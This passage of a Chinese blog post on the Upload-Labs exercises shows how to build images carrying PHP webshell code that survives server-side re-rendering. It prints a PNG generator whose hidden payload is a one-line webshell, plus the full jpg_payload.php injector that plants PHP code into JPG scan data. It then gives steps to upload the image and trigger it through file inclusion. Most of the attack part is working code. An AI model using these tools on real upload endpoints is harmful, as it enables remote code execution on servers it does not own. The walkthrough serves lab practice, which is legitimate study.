+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p &#x3D; array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img &#x3D; imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y &#x3D; 0; $y &lt; sizeof($p); $y +&#x3D; 3) &#123;</span><br><span class="line">   $r &#x3D; $p[$y];</span><br><span class="line">   $g &#x3D; $p[$y+1];</span><br><span class="line">   $b &#x3D; $p[$y+2];</span><br><span class="line">   $color &#x3D; imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y &#x2F; 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#39;.&#x2F;1.png&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为<code>php.exe</code>的可执行文件，它是php提供的一种<strong>CLI</strong>模式，也就是<strong>命令行模式</strong>。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。</p>
+<p>​    还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。</p>
+<p>​    运行成功以后会找到一个名为<strong>1.png</strong>的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。</p>
+<p>​    但是这个生成的图片php代码是<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，<del>应该算吧</del></p>
+<h3 id="jpg格式-1"><a href="#jpg格式-1" class="headerlink" title="jpg格式"></a>jpg格式</h3><p>​    同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params">$filename, $data, $unlink = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params">$errno, $errstr, $errfile, $errline</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (<span class="keyword">int</span>)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename, $order = <span class="literal">false</span>, $fromString = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.$filename.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params">$skip</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h4><p>​    准备一个<strong>yoo.jpg</strong>图片，上传经过渲染以后再下载下到本地，保存为<strong>1.jpg</strong>。</p>
+<h4 id="插入代码"><a href="#插入代码" class="headerlink" title="插入代码"></a>插入代码</h4><p>​    使用脚本处理<strong>1.jpg</strong>插入php代码，执行命令<code>php jpg_payload.php 1.jpg</code>。php命令执行方法上面有。执行成功以后应该如图所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116212640.png"></p>
+<p>​    执行的目录下会多出一个名为<code>payload_1.jpg</code>的文件，这就是制作好的图片马。大佬的源码我是修改了一下的，可以修改上面的第25行代码，自定义插入想要的代码。</p>
+<h4 id="上传并验证"><a href="#上传并验证" class="headerlink" title="上传并验证"></a>上传并验证</h4><p>​    上传以后同样先确定图片的名称和地址，适用文件包含进行验证</p>
+<p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116215008.png"></p>
+<p>​    如果如图所示，我们的图片马就上传成功了。<strong>需要提醒：有些图片不行可能需要多换几个图片试一试！！！</strong></p>
+<p>呼，终于可以休息了。</p>
+</div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传漏洞</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116224711.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/Mwechat.jpg" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/Mwechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/Malipay.png" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/Malipay.png" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/Upload-Labs5/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201119174619.jpg" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Upload-Labs的最后几道题</div></div></a></div><div class="next-post pull-right"><a href="/2020/Upload-Labs3/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116160237.png" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/other/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Upload-Labs(三)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/Upload-Labs1/" title="Upload-Labs(一)"><img class="cover" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111104319.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-08</div><div class="title">Upload-Labs(一)</div></div></a></div><div><a href="/2020/Upload-Labs2/" title="Upload-Labs(二)"><img class="cover" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111104025.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-09</div><div class="title">Upload-Labs(二)</div></div></a></div><div><a href="/2020/Upload-Labs3/" title="Upload-Labs(三)"><img class="cover" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116160237.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-16</div><div class="title">Upload-Labs(三)</div></div></a></div><div><a href="/2020/Upload-Labs5/" title="Upload-Labs的最后几道题"><img class="cover" src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201119174619.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-19</div><div class="title">Upload-Labs的最后几道题</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div class="comment-switch"><span class="first-comment">Valine</span><label><input id="switch-comments-btn" type="checkbox"/><span class="slider"></span></label><span class="second-comment">Disqusjs</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Braindance</div><div class="framework-info"><span>框架 </span><a href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">兴趣使然</div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/js/utils.js"></script><script src="https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const initData = {
+      el: '#vcomment',
+      appId: 'shaenDlkzwy9NvdCNJVrJspu-MdYXbMMI',
+      appKey: 'e074xMKoSw3B9kWmBediaBE9',
+      placeholder: 'Just Go Go.(偷偷说下，昵称输入自己QQ号会自动获取头像和昵称)',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/guobang-yoo/CDN@master/emoji/',
+      emojiMaps: {"tv_doge":"doge.gif","tv_亲亲":"亲亲.gif","tv_偷笑":"偷笑.gif","tv_再见":"再见.gif","tv_发怒":"发怒.gif","tv_发财":"发财.gif","tv_可爱":"可爱.gif","tv_吐血":"吐血.gif","tv_呆":"呆.gif","tv_呕吐":"呕吐.gif","tv_困":"困.gif","tv_坏笑":"坏笑.gif","tv_大佬":"大佬.gif","tv_大哭":"大哭.gif","tv_委屈":"委屈.gif","tv_害羞":"害羞.gif","tv_尴尬":"尴尬.gif","tv_微笑":"微笑.gif","tv_思考":"思考.gif","tv_打脸":"打脸.gif","tv_抓狂":"抓狂.gif","tv_抠鼻子":"抠鼻子.gif","tv_斜眼笑":"斜眼笑.gif","tv_晕":"晕.gif","tv_流汗":"流汗.gif","tv_流鼻血":"流鼻血.gif","tv_点赞":"点赞.gif","tv_生气":"生气.gif","tv_生病":"生病.gif","tv_疑问":"疑问.gif","tv_白眼":"白眼.gif","tv_睡着":"睡着.gif","tv_笑哭":"笑哭.gif","tv_腼腆":"腼腆.gif","tv_色":"色.gif","tv_调皮":"调皮.gif","tv_鄙视":"鄙视.gif","tv_闭嘴":"闭嘴.gif","tv_难过":"难过.gif","tv_馋":"馋.gif","tv_黑人问号":"黑人问号.gif","tv_鼓掌":"鼓掌.gif","2233_吃惊":"吃惊n.png","2233_大哭":"大哭.png","2233_大笑":"大笑n.png","2233_第一":"第一.png","2233_汗":"汗n.png","2233_喝水":"喝水.png","2233_困惑":"困惑n.png","2233_卖萌":"卖萌n.png","2233_怒":"怒.png","2233_吐魂":"吐魂.png","2233_委屈":"委屈.png","2233_无言":"无言.png","2233_耶":"耶.png","2233_疑问":"疑问n.png","2233_郁闷":"郁闷.png","蛆音娘_die":"die.png","蛆音娘_OK":"OK.png","蛆音娘_吃瓜群众":"吃瓜群众.png","蛆音娘_吃惊":"吃惊q.png","蛆音娘_大笑":"大笑.png","蛆音娘_肥皂":"肥皂.png","蛆音娘_扶额":"扶额.png","蛆音娘_害怕":"害怕.png","蛆音娘_哼":"哼.png","蛆音娘_滑稽":"滑稽.png","蛆音娘_机智":"机智.png","蛆音娘_哭泣":"哭泣q.png","蛆音娘_卖萌":"卖萌.png","蛆音娘_生气":"生气.png","蛆音娘_睡觉觉":"睡觉觉.png","蛆音娘_偷看":"偷看.png","蛆音娘_吐血":"吐血.png","蛆音娘_无语":"无语q.png","蛆音娘_摇头":"摇头.png","蛆音娘_疑问":"疑问.png"},
+      enableQQ: true,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick'.split(','))
+    }
+
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqusjs () {
+  function addDisqusjsCSS () {
+    const ele = document.createElement('link')
